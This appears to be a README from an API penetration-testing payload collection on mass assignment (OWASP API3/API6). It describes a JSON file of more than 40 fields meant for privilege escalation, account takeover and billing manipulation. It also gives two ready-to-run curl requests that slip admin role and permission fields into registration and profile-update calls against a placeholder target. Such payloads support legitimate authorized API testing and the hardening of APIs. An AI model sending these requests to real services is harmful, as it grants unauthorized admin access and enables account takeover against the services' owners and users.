# Mass Assignment Payloads

> **OWASP API**: API3/API6 — Broken Object Property Level Authorization

## Files

| File | Description |
|------|-------------|
| [`mass_assignment_payloads.json`](mass_assignment_payloads.json) | 40+ fields for privilege escalation, account takeover, billing manipulation, status/feature flags |

## Quick Test

```bash
# Add hidden fields to registration
curl -X POST https://api.target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123","role":"admin","is_admin":true}'

# Add hidden fields to profile update
curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin","permissions":["admin"]}'
```
